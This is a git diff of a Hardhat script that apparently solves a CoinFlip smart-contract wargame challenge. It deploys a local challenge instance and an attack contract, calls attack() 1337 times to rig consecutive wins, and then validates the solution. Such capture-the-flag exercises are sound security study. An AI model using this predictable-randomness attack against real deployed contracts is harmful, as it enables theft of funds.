@@ -1,27 +1,44 @@
-const {ethers} = require('hardhat');
-
-const CTRT_ADDR = "0x94099942864EA81cCF197E9D71ac53310b1468D8";
-const PLAYER_ADDR = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
+const { ethers } = require('hardhat');
 
 async function main() {
-  const player = await ethers.getSigner(PLAYER_ADDR);
-  const contract = await ethers.getContractAt("CoinFlip", CTRT_ADDR, player);
+  const [owner, player] = await ethers.getSigners();
 
-  console.log("--[1] deploy attacker contract");
+  console.log("[1] deploy CoinFlipFactory");
+  const Factory = await ethers.getContractFactory("CoinFlipFactory");
+  const factory = await Factory.deploy();
+  await factory.deployed();
+
+  console.log("[2] create a CoinFlip instance");
+  const receipt = await factory.createInstance(owner.address);
+  const coinFlip_address = (await receipt.wait()).events[0].args[0];
+  const coinFlip = await ethers.getContractAt("CoinFlip", coinFlip_address, owner);
+
+  console.log("[3] deploy CoinFlipAttack");
   const Attack = await ethers.getContractFactory("CoinFlipAttack");
   const attack = await Attack.deploy();
   await attack.deployed();
 
+  console.log("[4] call attack() 1337 times");
 
-  let cnt = 0;
+  const begin_time = (new Date).getTime();;
 
-  for(cnt = 0; cnt < 10; cnt++) {
-    await attack.attack(CTRT_ADDR)
+  for(let i = 0; i < 1337; i++) {
+    await attack.attack(coinFlip.address);
   }
 
-  console.log("--[2] check")
-  console.log(await contract.consecutiveWins());
+  console.log('----attack has been taken', ((new Date).getTime() - begin_time) / 1000, 's');
 
+  console.log("----consecutive wins: ", 
+    (await coinFlip.consecutiveWins()).toString());
+
+
+  console.log("[5] validate solved");
+  const res = await factory.validateInstance(coinFlip.address, player.address);
+  if (res == true) {
+    console.log("[+] Done!");
+  } else {
+    console.log("[+] Fail...");
+  }
 }
 
 main().catch((error) => {
